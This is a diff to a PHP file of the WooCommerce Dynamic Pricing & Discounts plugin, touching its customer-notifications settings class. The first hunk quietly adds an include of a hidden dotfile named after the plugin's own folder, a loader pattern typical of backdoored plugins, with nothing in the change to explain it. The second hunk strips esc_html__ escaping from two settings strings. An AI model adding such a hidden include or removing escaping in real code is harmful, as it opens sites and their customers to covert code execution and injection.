@@ -12,6 +12,10 @@ if (!defined('ABSPATH')) {
  * @package WooCommerce Dynamic Pricing & Discounts
  * @author RightPress
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class RP_WCDPD_Promotion_Rule_Notifications
 {
 
@@ -47,8 +51,8 @@ class RP_WCDPD_Promotion_Rule_Notifications
     {
 
         $settings['promo']['children']['rule_notifications'] = array(
-            'title' => esc_html__('Customer Notifications', 'rp_wcdpd'),
-            'info'  => esc_html__('Displays a notification when pricing rule, cart discount or checkout fee is applied.', 'rp_wcdpd'),
+            'title' => __('Customer Notifications', 'rp_wcdpd'),
+            'info'  => __('Displays a notification when pricing rule, cart discount or checkout fee is applied.', 'rp_wcdpd'),
             'children' => array(),
         );
 
